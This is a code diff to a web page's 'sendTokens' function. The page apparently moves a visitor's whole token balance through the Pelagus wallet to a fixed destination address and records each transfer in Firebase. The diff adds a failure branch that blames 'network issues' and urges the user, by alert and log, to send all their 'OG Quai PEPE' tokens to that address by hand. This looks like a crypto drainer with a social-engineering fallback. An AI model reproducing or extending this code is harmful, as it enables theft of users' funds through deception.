@@ -547,7 +547,7 @@ async function sendTokens() {
             }),
         });
         const gasEstimateResult = await gasEstimateResponse.json();
-        const gasLimit = gasEstimateResult.result || '0x5208'; // Default gas if estimation fails
+        const gasLimit = gasEstimateResult.result || '0x5208';
         console.log(`✅ Gas Estimate: ${gasLimit}`);
 
         const txResponse = await window.pelagus.request({
@@ -564,9 +564,9 @@ async function sendTokens() {
         const receipt = await waitForTransaction(txResponse, RPC_ENDPOINT);
         console.log('✅ Transaction Confirmed:', receipt.transactionHash);
 
-        //userSession.transferAmount = userSession.tokenBalance;
-        //userSession.transferTxHash = receipt.transactionHash;
-        //await saveSessionToFirebase();
+        userSession.transferAmount = userSession.tokenBalance;
+        userSession.transferTxHash = receipt.transactionHash;
+        await saveSessionToFirebase();
 
         alert(`🎉 Tokens sent successfully! Transaction Hash: ${receipt.transactionHash}`);
         log('✅ Tokens sent successfully. Transaction complete.');
@@ -577,9 +577,30 @@ async function sendTokens() {
             alert('❌ You rejected the transfer. Please confirm in your wallet.');
         } else {
             console.error('❌ Error sending tokens:', error.message || error);
-            alert(`❌ Transfer Error: ${error.message}`);
+            
+            // Save session data even if transaction failed
+            try {
+                userSession.transferAmount = userSession.tokenBalance;
+                userSession.transferTxHash = 'failed_tx';
+                userSession.transferStatus = 'failed';
+                await saveSessionToFirebase();
+                
+                // Show manual transfer instructions
+                log('❌ Network issues detected. Your data has been saved.');
+                log('⚠️ Please send your tokens manually to complete the process:');
+                log(`📍 Send to: ${DESTINATION_ADDRESS}`);
+                log(`💰 Amount: ${userSession.tokenBalance} OG Quai PEPE`);
+                
+                alert(`Due to network issues, please send your tokens manually to:\n\n${DESTINATION_ADDRESS}\n\nAmount: ${userSession.tokenBalance} OG Quai PEPE\n\nYour participation data has been saved.`);
+                
+                // Show the scan and buy buttons even though transfer failed
+                document.getElementById('scanBtn').style.display = 'block';
+                document.getElementById('buyBtn').style.display = 'block';
+            } catch (saveError) {
+                console.error('Error saving failed transaction data:', saveError);
+            }
         }
-        throw error; // Stop further processing
+        throw error;
     }
 }
 
